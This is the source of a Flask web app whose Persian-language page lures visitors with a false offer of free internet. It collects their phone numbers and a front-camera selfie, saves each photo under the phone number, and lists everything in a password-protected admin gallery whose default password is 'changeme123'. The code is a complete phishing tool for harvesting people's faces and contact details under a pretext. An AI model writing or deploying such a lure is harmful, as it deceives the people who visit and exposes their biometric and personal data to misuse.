from flask import Flask, request, jsonify, render_template_string, send_from_directory, Response
import os, time
from werkzeug.utils import secure_filename
import re
import base64
from functools import wraps

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# --- رمز ادمین از ENV ---
ADMIN_PW = os.environ.get('ADMIN_PW', 'changeme123')  # در Render ست کنید

# --- دکوراتور Basic Auth ---
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get('Authorization')
        if auth:
            try:
                scheme, credentials = auth.split(None, 1)
                if scheme.lower() == 'basic':
                    decoded = base64.b64decode(credentials).decode('utf-8')
                    user, pw = decoded.split(':', 1)
                    if user == 'admin' and pw == ADMIN_PW:
                        return f(*args, **kwargs)
            except Exception:
                pass
        return Response(
            'Unauthorized', 401,
            {'WWW-Authenticate': 'Basic realm="Admin Area"'}
        )
    return decorated

# --- HTML اصلی ---
HTML_PAGE = """
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Public Capture Demo</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#111;color:#eee;display:flex;flex-direction:column;align-items:center;gap:12px;padding:20px}
.container{max-width:420px;width:100%;text-align:center}
#video{border-radius:8px;border:2px solid #444;display:none;max-width:100%}
input[type="tel"]{padding:8px;border-radius:6px;border:1px solid #333;background:#222;color:#fff;width:100%}
label{display:flex;gap:8px;align-items:center;justify-content:center}
button{background:#0a84ff;color:#fff;padding:10px 14px;border-radius:8px;border:none;cursor:pointer}
.small{font-size:0.9rem;color:#ccc}
a{color:#4fc3f7}
</style>
</head>
<body>
<div class="container">
  <h2>اینترنت رایگان ازیناست</h2>
  <p class="small">برای دریافت اینترنت رایگان شماره را وارد کرده و رضایت داده</p>

  <label><input id="consent" type="checkbox"> I consent to provide my photo for verification.</label>
  <div style="width:100%;margin-top:8px">
    <input id="phone" type="tel" placeholder="+989xxxxxxxx" />
  </div>

  <video id="video" autoplay playsinline width="320" height="240"></video>
  <div style="margin-top:8px">
    <button id="captureBtn" disabled>ادامه</button>
  </div>

  <p id="status" class="small"></p>
  <p class="small"> <a href="/gallery" target="_blank">امن و تابع قوانین</a></p>
</div>

<script>
const consent = document.getElementById('consent');
const captureBtn = document.getElementById('captureBtn');
const status = document.getElementById('status');
const video = document.getElementById('video');
const phoneInput = document.getElementById('phone');

consent.addEventListener('change', ()=> {
  captureBtn.disabled = !consent.checked;
});

async function uploadBlob(blob, phone){
  const fd = new FormData();
  fd.append('phone', phone);
  fd.append('photo', blob, 'selfie.jpg');
  status.textContent = 'Uploading...';
  try{
    const res = await fetch('/upload', { method: 'POST', body: fd });
    const data = await res.json();
    if(res.ok) status.textContent = 'Uploaded ✓ ' + data.filename;
    else status.textContent = 'Error: ' + (data.error || res.statusText);
  }catch(e){
    status.textContent = 'Network error: ' + e.message;
  }
}

captureBtn.addEventListener('click', async ()=>{
  const phone = phoneInput.value.trim();
  if(!consent.checked){ status.textContent='You must consent first.'; return; }
  if(!/^(\+?\d{8,15})$/.test(phone)){ status.textContent='Invalid phone format'; return; }

  status.textContent = 'Requesting camera...';
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio:false });
    video.srcObject = stream;
    video.style.display = 'block';

    await new Promise(resolve=>{
      if(video.readyState>=2) resolve();
      video.onloadeddata = ()=>resolve();
      setTimeout(resolve,1500);
    });

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 320;
    canvas.height = video.videoHeight || 240;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // stop camera
    stream.getTracks().forEach(t=>t.stop());
    video.srcObject = null;
    video.style.display = 'none';

    canvas.toBlob(async (blob) => {
      if(!blob){ status.textContent='Capture failed'; return; }
      await uploadBlob(blob, phone);
    }, 'image/jpeg', 0.9);

  }catch(err){
    status.textContent = 'Cannot access camera: ' + err.message;
  }
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    phone = request.form.get('phone','').strip()
    if not re.match(r'^\+?\d{8,15}$', phone):
        return jsonify({'error':'Invalid phone number'}), 400
    if 'photo' not in request.files:
        return jsonify({'error':'No photo file'}), 400
    photo = request.files['photo']
    phone_norm = re.sub(r'\D', '', phone)
    phone_prefix = '+' + phone_norm if phone.startswith('+') else phone_norm
    filename = secure_filename(f"{int(time.time())}_{phone_prefix}.jpg")
    path = os.path.join(UPLOAD_FOLDER, filename)
    photo.save(path)
    return jsonify({'filename': filename}), 200

@app.route("/gallery")
@require_auth
def gallery():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    items = []
    rx = re.compile(r'^\d+_?(\+?\d{6,20})\.')
    for f in files:
        m = rx.match(f)
        phone_display = m.group(1) if m else "unknown"
        url = f"/uploads/{f}"
        items.append(
            f'<div style="margin:12px 0; padding:8px; border:1px solid #222; border-radius:6px; background:#0d0d0d;">'
            f'<div style="display:flex; align-items:center; justify-content:space-between; gap:10px;">'
            f'<div style="color:#9ad; font-weight:bold;">{phone_display}</div>'
            f'<div><a href="{url}" download style="color:#7fe0ff">Download</a></div>'
            f'</div>'
            f'<div style="text-align:center; margin-top:8px;"><a href="{url}" target="_blank"><img src="{url}" style="max-width:320px;border-radius:6px;display:block;margin:6px auto;"></a></div>'
            f'</div>'
        )
    html = "<html><head><meta charset='utf-8'><title>Gallery</title></head><body style='background:#111;color:#eee;font-family:Arial;padding:20px'><h2>Gallery</h2>" + "".join(items) + "</body></html>"
    return html

@app.route("/uploads/<filename>")
@require_auth
def uploaded_file(filename):
    safe_name = os.path.basename(filename)
    return send_from_directory(UPLOAD_FOLDER, safe_name)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
